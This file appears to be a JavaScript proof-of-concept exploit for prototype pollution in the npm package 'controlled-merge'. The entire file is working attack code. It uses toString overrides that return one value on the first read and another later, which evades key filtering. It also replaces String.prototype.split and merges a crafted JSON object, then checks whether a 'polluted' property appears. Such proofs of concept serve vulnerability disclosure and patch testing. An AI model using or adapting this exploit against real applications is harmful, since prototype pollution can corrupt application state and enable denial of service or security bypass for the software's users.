var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
console.log({}.polluted);
const merge = require('controlled-merge');
const obj = merge({}, JSON.parse('{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'), true);
console.log('{ ' + obj.prototype.polluted + ', ' + 'yes' + ' }');